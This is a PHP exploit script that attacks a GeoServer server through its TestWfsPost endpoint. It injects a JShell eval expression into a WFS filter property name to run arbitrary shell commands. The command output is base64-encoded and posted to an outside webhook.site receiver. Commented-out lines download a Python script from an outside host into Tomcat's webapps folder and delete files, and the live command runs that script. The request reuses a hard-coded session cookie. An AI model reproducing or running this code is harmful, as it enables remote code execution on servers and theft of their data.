<?php
function cmd($cmd, $receiver)
{

    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'http://192.168.2.160:8080/geoserver/TestWfsPost',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => 'form_hf_0=&url=http%3A%2F%2F192.168.2.160%3A8080%2Fgeoserver%2Fwfs&body=%3C!--%20Performs%20an%20intersects%20against%20a%20point.%20%20This%20is%20functionally%20--%3E%0D%0A%3C!--%20equivalent%20to%20%3CNot%3E%3CDisjoint%3E.%20%20This%20call%20can%20be%20used%20by%20a%20%20%20%20--%3E%0D%0A%3C!--%20client%20application%20to%20select%20a%20feature%20clicked%20on.%20%20%0D%0A%0D%0A%20%20%20%20%20This%20will%20search%20through%20the%20dataset%20and%20return%20any%20polygons%20that%0D%0A%20%20%20%20%20contain%20the%20search%20point.%20%20%0D%0A%20%20%20%20%20%0D%0A%20%20%20%20%20If%20you%20were%20searching%20in%20a%20point%20or%20line%20dataset%2C%20you%20might%20want%0D%0A%20%20%20%20%20to%20make%20a%20little%20polygon%20to%20search%20with%20instead%20of%20a%20single%20point%0D%0A%20%20%20%20%20so%20the%20user%20doesnt%20have%20to%20*exactly*%20click%20on%20the%20(mathematically%0D%0A%20%20%20%20%20infinitely%20thin)%20line%20or%20point.%20%20%20%20%20%0D%0A%0D%0A%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3DWFS_getFeatureIntersects-1.0.xml%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%0D%0A%20--%3E%0D%0A%3Cwfs%3AGetFeature%20service%3D%22WFS%22%20version%3D%221.0.0%22%0D%0A%20%20outputFormat%3D%22GML2%22%0D%0A%20%20xmlns%3Awfs%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%22%0D%0A%20%20xmlns%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22%0D%0A%20%20xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%22%0D%0A%20%20xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22%0D%0A%20%20xsi%3AschemaLocation%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20http%3A%2F%2Fschemas.opengis.net%2Fwfs%2F1.0.0%2FWFS-basic.xsd%22%3E%0D%0A%20%20%3Cwfs%3AQuery%20typeName%3D%22topp%3Apf_markets%22%3E%0D%0A%20%20%20%20%3CFilter%3E%0D%0A%20%20%20%20%20%20%3CIntersects%3E%0D%0A%20%20%20%20%20%20%20%20%3CPropertyName%3Eeval(build(jdk.jshell.JShell.builder())%2C%20\'try%20%7B%0D%0A%20%20%20%20Process%20process%20%3D%20Runtime.getRuntime().exec(%22' . $cmd . '%22)%3B%0D%0A%20%20%20%20%0D%0A%20%20%20%20java.io.BufferedReader%20reader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(process.getInputStream()))%3B%0D%0A%20%20%20%20StringBuilder%20output%20%3D%20new%20StringBuilder()%3B%0D%0A%20%20%20%20String%20line%3B%0D%0A%20%20%20%20while%20((line%20%3D%20reader.readLine())%20!%3D%20null)%20%7B%0D%0A%20%20%20%20%20%20%20%20output.append(line).append(%22%5Cn%22)%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20reader.close()%3B%0D%0A%0D%0A%20%20%20%20String%20encodedOutput%20%3D%20java.util.Base64.getEncoder().encodeToString(output.toString().getBytes(%22UTF-8%22))%3B%0D%0A%0D%0A%20%20%20%20java.net.URL%20url%20%3D%20new%20java.net.URL(%22' . $receiver . '%22)%3B%0D%0A%20%20%20%20java.net.HttpURLConnection%20connection%20%3D%20(java.net.HttpURLConnection)%20url.openConnection()%3B%0D%0A%20%20%20%20connection.setRequestMethod(%22POST%22)%3B%0D%0A%20%20%20%20connection.setDoOutput(true)%3B%0D%0A%0D%0A%20%20%20%20byte%5B%5D%20postDataBytes%20%3D%20encodedOutput.getBytes(%22UTF-8%22)%3B%0D%0A%20%20%20%20java.io.OutputStream%20os%20%3D%20connection.getOutputStream()%3B%0D%0A%20%20%20%20os.write(postDataBytes)%3B%0D%0A%20%20%20%20os.flush()%3B%0D%0A%20%20%20%20os.close()%3B%0D%0A%0D%0A%20%20%20%20int%20responseCode%20%3D%20connection.getResponseCode()%3B%0D%0A%20%20%20%20System.out.println(%22Response%20Code%3A%20%22%20%2B%20responseCode)%3B%0D%0A%0D%0A%20%20%20%20java.io.BufferedReader%20in%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(connection.getInputStream()))%3B%0D%0A%20%20%20%20StringBuilder%20response%20%3D%20new%20StringBuilder()%3B%0D%0A%20%20%20%20while%20((line%20%3D%20in.readLine())%20!%3D%20null)%20%7B%0D%0A%20%20%20%20%20%20%20%20response.append(line)%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20in.close()%3B%0D%0A%0D%0A%20%20%20%20System.out.println(%22Response%3A%20%22%20%2B%20response.toString())%3B%0D%0A%7D%20catch%20(Exception%20e)%20%7B%0D%0A%20%20%20%20e.printStackTrace()%3B%0D%0A%7D\')%3C%2FPropertyName%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3Cgml%3APoint%20srsName%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%2Fsrs%2Fepsg.xml%234326%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cgml%3Acoordinates%3E-74.817265%2C40.5296504%3C%2Fgml%3Acoordinates%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3C%2Fgml%3APoint%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2FIntersects%3E%0D%0A%20%20%20%20%20%20%3C%2FFilter%3E%0D%0A%20%20%3C%2Fwfs%3AQuery%3E%0D%0A%3C%2Fwfs%3AGetFeature%3E&username=&password=',
        CURLOPT_HTTPHEADER => array(
            'Host: 192.168.2.160:8080',
            'Cache-Control: max-age=0',
            'Accept-Language: en-US',
            'Upgrade-Insecure-Requests: 1',
            'Origin: http://192.168.2.160:8080',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer: http://192.168.2.160:8080/geoserver/web/wicket/page?1',
            'Cookie: JSESSIONID=3F27C65F7F97A9A6FF7CDFA08D1FD12F'
        ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}

$cmd = "python3 opt/tomcat/webapps/aggregate/mysql.py";
//$cmd = "python3 opt/tomcat/webapps/aggregate/unzip.py";
//$cmd = "ls -lha opt/tomcat/webapps/aggregate";
//$cmd = "rm opt/tomcat/webapps/aggregate/test.py";
//$cmd = "curl -o opt/tomcat/webapps/aggregate/mysql.py https://sbnke.com/py/mysql2.py";


//$cmd = urlencode($cmd);
//$cmd = str_replace(' ','+',$cmd);
//echo $cmd;

//die();

$receiver = 'https://webhook.site/c65681a6-10bf-4f2c-9538-b9af4b25386c';
$receiver = urlencode($receiver);

cmd($cmd, $receiver);
